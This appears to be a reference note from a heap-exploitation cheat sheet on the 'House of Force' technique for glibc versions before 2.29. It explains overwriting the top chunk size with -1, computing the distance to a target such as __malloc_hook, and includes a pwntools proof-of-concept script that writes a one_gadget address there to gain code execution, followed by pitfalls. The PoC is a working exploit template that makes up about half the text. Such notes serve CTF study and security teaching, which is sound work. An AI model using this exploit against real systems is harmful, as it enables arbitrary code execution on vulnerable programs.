# House of Force

**When**: Can overwrite the top chunk's size field. glibc < 2.29 (top chunk size check added in 2.29).
**Primitive needed**: Heap overflow into the top chunk header.
**Result**: Malloc returns an arbitrary address.

## Mechanism
Overwrite top chunk size to `0xffffffffffffffff` (−1). Now any `malloc(distance)` will succeed because the top chunk appears enormous. Compute `distance = target_addr − top_chunk_addr − header_size` and call `malloc(distance)`. The next `malloc` returns a chunk at `target_addr`.

## PoC
```python
# IN: heap overflow primitive that can overwrite top chunk size
#     target_addr (e.g., GOT entry, __malloc_hook, etc.)
# OUT: arbitrary write at target_addr
from pwn import *

context.binary = elf = ELF('./binary')
p = process('./binary')

# Step 1: Overflow to overwrite top chunk size with -1
alloc(0, 0x18, b'A'*0x18 + p64(0xffffffffffffffff))

# Step 2: Calculate distance
# top_chunk_addr is right after our allocation
# target = __malloc_hook (or any writable address)
target = libc.sym['__malloc_hook']
top_addr = heap_base + first_alloc_size + 0x10  # adjust to actual layout
distance = target - top_addr - 0x20  # account for chunk headers

# Step 3: Consume the gap
alloc(1, distance, b'')

# Step 4: Next allocation lands at target
alloc(2, 0x18, p64(one_gadget))  # overwrite __malloc_hook

# Step 5: Trigger — any malloc call now executes one_gadget
alloc(3, 0x18, b'')

p.interactive()
```

## Trap
- glibc 2.29+ added `assert(size <= old_top_size)` in `_int_malloc` — blocks this technique.
- The distance calculation must be exact. Off-by-one in header math = crash.
- For negative distance (target below top): works because `size_t` is unsigned, so large positive wraps around.
